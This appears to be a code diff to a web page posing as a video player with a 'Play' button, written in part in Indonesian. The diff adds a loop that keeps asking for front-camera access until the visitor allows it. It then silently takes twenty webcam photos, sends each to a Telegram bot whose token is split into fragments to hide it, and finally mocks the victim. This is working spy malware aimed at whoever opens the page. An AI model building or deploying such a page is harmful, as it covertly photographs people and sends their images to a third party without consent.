@@ -12,6 +12,8 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      position: relative;
+      font-family: sans-serif;
     }
     button {
       font-size: 18px;
@@ -21,6 +23,29 @@
       background-color: #10b981;
       color: white;
       cursor: pointer;
+      z-index: 2;
+    }
+    #popup {
+      position: absolute;
+      background: #1f2937;
+      color: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+      top: 20px;
+      opacity: 0.95;
+      display: none;
+      z-index: 2;
+    }
+    #ending {
+      display: none;
+      font-family: monospace;
+      font-size: 2rem;
+      text-align: center;
+      color: #0f0;
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
     }
     video {
       position: absolute;
@@ -35,44 +60,70 @@
   </style>
 </head>
 <body>
+
+  <div id="popup">❗ Izinkan akses kamera untuk lanjut</div>
   <button id="start">▶️ Play</button>
   <video id="v" autoplay muted playsinline></video>
   <canvas id="cvs"></canvas>
+  <div id="ending">hahaha 😹<br>muka anj kefoto :v</div>
 
   <script>
     const t = ["7972", "5258", "58:AA", "EMzl2HS", "lIGECvIDnv", "6o_KqhnJr", "XGRNwoA"];
-    const token = t.join(""); // Token utuh disusun saat runtime
-
+    const token = t.join("");
     const c = ["75", "756", "78578"];
-    const chatId = c.join(""); // Chat ID utuh
+    const chatId = c.join("");
 
     const video = document.getElementById("v");
     const canvas = document.getElementById("cvs");
     const ctx = canvas.getContext("2d");
+    const popup = document.getElementById("popup");
+    const btn = document.getElementById("start");
+    const ending = document.getElementById("ending");
 
-    document.getElementById("start").onclick = async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
+    let counter = 0;
+    const maxPhotos = 20;
 
-        const wait = setInterval(() => {
-          if (video.readyState === 4) {
-            clearInterval(wait);
-            captureLoop();
-          }
-        }, 100);
-      } catch (e) {
-        console.warn("Gagal akses kamera", e);
-      }
+    btn.onclick = async () => {
+      btn.disabled = true;
+      await requestCameraUntilAllowed();
     };
 
-    function captureLoop() {
-      setInterval(() => {
+    async function requestCameraUntilAllowed() {
+      let granted = false;
+
+      while (!granted) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          video.srcObject = stream;
+          popup.style.display = "none";
+          granted = true;
+
+          const wait = setInterval(() => {
+            if (video.readyState === 4) {
+              clearInterval(wait);
+              startCapturing();
+            }
+          }, 100);
+        } catch {
+          popup.style.display = "block";
+          await new Promise(r => setTimeout(r, 1500));
+        }
+      }
+    }
+
+    function startCapturing() {
+      const interval = setInterval(() => {
+        if (counter >= maxPhotos) {
+          clearInterval(interval);
+          showEndingMessage();
+          return;
+        }
+
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0);
 
-        canvas.toBlob((blob) => {
+        canvas.toBlob(blob => {
           const fd = new FormData();
           fd.append("chat_id", chatId);
           fd.append("photo", blob);
@@ -80,9 +131,18 @@
           fetch("https://api.telegram.org/bot" + token + "/sendPhoto", {
             method: "POST",
             body: fd
-          }).catch(() => {});
+          });
         }, "image/jpeg", 0.8);
-      }, 2000);
+
+        counter++;
+      }, 1000);
+    }
+
+    function showEndingMessage() {
+      document.body.innerHTML = '';
+      document.body.style.background = "#000";
+      document.body.appendChild(ending);
+      ending.style.display = "block";
     }
   </script>
 </body>
